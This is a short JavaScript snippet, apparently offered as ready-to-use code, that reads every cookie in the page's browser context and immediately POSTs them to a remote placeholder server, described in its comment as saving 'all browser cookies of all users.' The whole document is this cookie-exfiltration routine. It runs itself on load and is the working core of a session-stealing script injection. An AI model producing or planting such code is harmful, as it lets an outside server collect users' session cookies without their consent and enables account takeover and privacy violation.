// This code saves all browser cookies of all users to the server

// Send a POST request to the server containing the cookies
function sendCookiesToServer() {
  const cookies = document.cookie;
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://your-server-url.com/save-cookies", true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({ cookies }));

  // You may handle the server's response here if needed
}

// Call the function to send cookies to the server
sendCookiesToServer();
